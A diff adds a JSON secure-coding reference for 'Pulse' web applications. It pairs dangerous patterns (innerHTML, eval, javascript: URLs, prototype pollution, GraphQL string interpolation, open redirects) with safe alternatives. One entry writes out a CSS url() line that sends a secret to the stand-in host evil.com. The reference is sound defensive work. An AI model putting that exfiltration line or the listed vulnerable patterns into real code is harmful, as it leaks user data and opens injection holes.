@@ -1,0 +1,101 @@
+{
+  "description": "Common dangerous patterns in Pulse applications and their secure alternatives",
+  "patterns": [
+    {
+      "id": "XSS-INNERHTML",
+      "category": "XSS",
+      "severity": "critical",
+      "dangerous": "element.innerHTML = userInput",
+      "safe": "el('div', userInput) or dangerouslySetInnerHTML(el, html, { sanitize: true })",
+      "reason": "innerHTML parses and executes HTML/scripts from untrusted input"
+    },
+    {
+      "id": "XSS-EVAL",
+      "category": "XSS",
+      "severity": "critical",
+      "dangerous": "eval(userInput) or new Function(userInput)",
+      "safe": "JSON.parse() for data, template literals for strings",
+      "reason": "eval executes arbitrary JavaScript code"
+    },
+    {
+      "id": "XSS-DOC-WRITE",
+      "category": "XSS",
+      "severity": "critical",
+      "dangerous": "document.write(userContent)",
+      "safe": "el() and mount()",
+      "reason": "document.write can inject and execute arbitrary HTML"
+    },
+    {
+      "id": "XSS-JAVASCRIPT-URL",
+      "category": "XSS",
+      "severity": "high",
+      "dangerous": "element.href = userUrl (without validation)",
+      "safe": "const safe = sanitizeUrl(userUrl); if (safe) element.href = safe",
+      "reason": "javascript: protocol in URLs executes code on click"
+    },
+    {
+      "id": "XSS-EVENT-ATTR",
+      "category": "XSS",
+      "severity": "high",
+      "dangerous": "element.setAttribute('onclick', userCode)",
+      "safe": "on(element, 'click', handler) or safeSetAttribute()",
+      "reason": "Event handler attributes execute code strings"
+    },
+    {
+      "id": "XSS-ADJACENT-HTML",
+      "category": "XSS",
+      "severity": "high",
+      "dangerous": "element.insertAdjacentHTML('beforeend', userHtml)",
+      "safe": "element.appendChild(el('div', userText))",
+      "reason": "insertAdjacentHTML parses HTML like innerHTML"
+    },
+    {
+      "id": "CSS-INJECTION",
+      "category": "CSS",
+      "severity": "medium",
+      "dangerous": "element.style.cssText = userValue",
+      "safe": "safeSetStyle(element, property, value)",
+      "reason": "CSS can load external resources via url() or execute code via expression()"
+    },
+    {
+      "id": "CSS-EXFILTRATION",
+      "category": "CSS",
+      "severity": "medium",
+      "dangerous": "element.style.background = `url(evil.com/steal?data=${secret})`",
+      "safe": "sanitizeCSSValue(value) blocks url() by default",
+      "reason": "CSS url() can exfiltrate data to external servers"
+    },
+    {
+      "id": "PROTO-POLLUTION",
+      "category": "Prototype",
+      "severity": "high",
+      "dangerous": "Object.assign(target, JSON.parse(userJson))",
+      "safe": "Object.assign(target, sanitizeObjectKeys(JSON.parse(userJson)))",
+      "reason": "__proto__ in JSON can inject properties on all objects"
+    },
+    {
+      "id": "TIMER-STRING",
+      "category": "XSS",
+      "severity": "high",
+      "dangerous": "setTimeout('alert(1)', 100)",
+      "safe": "setTimeout(() => alert(1), 100)",
+      "reason": "String argument to setTimeout acts like eval()"
+    },
+    {
+      "id": "GRAPHQL-INTERPOLATION",
+      "category": "Injection",
+      "severity": "high",
+      "dangerous": "useQuery(`query { user(id: \"${userId}\") { name } }`)",
+      "safe": "useQuery('query GetUser($id: ID!) { user(id: $id) { name } }', { id: userId })",
+      "reason": "String interpolation in GraphQL allows query injection"
+    },
+    {
+      "id": "OPEN-REDIRECT",
+      "category": "Navigation",
+      "severity": "medium",
+      "dangerous": "window.location = userUrl",
+      "safe": "const safe = sanitizeUrl(userUrl); if (safe) router.navigate(safe)",
+      "reason": "Unvalidated redirects can send users to phishing sites"
+    }
+  ]
+}
